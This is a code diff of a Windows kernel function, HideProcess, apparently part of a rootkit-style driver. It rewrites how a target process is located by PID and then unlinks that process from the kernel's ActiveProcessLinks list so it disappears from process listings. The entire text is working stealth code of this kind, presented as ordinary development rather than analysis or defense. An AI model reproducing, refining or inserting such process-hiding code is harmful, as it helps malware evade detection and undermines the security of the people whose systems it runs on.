@@ -116,51 +116,29 @@ OB_PREOP_CALLBACK_STATUS OnPreOpenThread(PVOID RegistrationContext, POB_PRE_OPER
 * @status [NTSTATUS] -- Whether successfully hidden or not.
 */
 NTSTATUS HideProcess(ULONG pid) {
-	// Getting the offset depending on the OS version.
-	ULONG pidOffset = GetActiveProcessLinksOffset();
+	PEPROCESS targetProcess;
+	NTSTATUS status = STATUS_SUCCESS;
+	ULONG activeProcessLinkListOffset = GetActiveProcessLinksOffset();
 	ULONG lockOffset = GetProcessLockOffset();
 
-	if (pidOffset == STATUS_UNSUCCESSFUL || lockOffset == STATUS_UNSUCCESSFUL) {
+	if (activeProcessLinkListOffset == STATUS_UNSUCCESSFUL || lockOffset == STATUS_UNSUCCESSFUL)
 		return STATUS_UNSUCCESSFUL;
-	}
-	ULONG listOffset = pidOffset + sizeof(INT_PTR);
 
-	// Enumerating the EPROCESSes and finding the target pid.
-	PEPROCESS currentEProcess = PsGetCurrentProcess();
-	PLIST_ENTRY currentList = (PLIST_ENTRY)((ULONG_PTR)currentEProcess + listOffset);
-	PUINT32 currentPid = (PUINT32)((ULONG_PTR)currentEProcess + pidOffset);
+	status = PsLookupProcessByProcessId(ULongToHandle(pid), &targetProcess);
+
+	if (!NT_SUCCESS(status))
+		return status;
+
+	PLIST_ENTRY processListEntry = (PLIST_ENTRY)((ULONG_PTR)targetProcess + activeProcessLinkListOffset);
 
 	// Using the ActiveProcessLinks lock to avoid accessing problems.
-	PEX_PUSH_LOCK listLock = (PEX_PUSH_LOCK)((ULONG_PTR)currentEProcess + lockOffset);
+	PEX_PUSH_LOCK listLock = (PEX_PUSH_LOCK)((ULONG_PTR)targetProcess + lockOffset);
 	ExAcquirePushLockExclusive(listLock);
-
-	if (*(UINT32*)currentPid == pid) {
-		RemoveListLinks(currentList);
-		ExReleasePushLockExclusive(listLock);
-		return STATUS_SUCCESS;
-	}
-
-	PEPROCESS StartProcess = currentEProcess;
-
-	currentEProcess = (PEPROCESS)((ULONG_PTR)currentList->Flink - listOffset);
-	currentPid = (PUINT32)((ULONG_PTR)currentEProcess + pidOffset);
-	currentList = (PLIST_ENTRY)((ULONG_PTR)currentEProcess + listOffset);
-
-	while ((ULONG_PTR)StartProcess != (ULONG_PTR)currentEProcess)
-	{
-		if (*(UINT32*)currentPid == pid) {
-			RemoveListLinks(currentList);
-			ExReleasePushLockExclusive(listLock);
-			return STATUS_SUCCESS;
-		}
-
-		currentEProcess = (PEPROCESS)((ULONG_PTR)currentList->Flink - listOffset);
-		currentPid = (PUINT32)((ULONG_PTR)currentEProcess + pidOffset);
-		currentList = (PLIST_ENTRY)((ULONG_PTR)currentEProcess + listOffset);
-	}
-
+	RemoveEntryList(processListEntry);
 	ExReleasePushLockExclusive(listLock);
-	return STATUS_UNSUCCESSFUL;
+	ObDereferenceObject(targetProcess);
+
+	return status;
 }
 
 /*
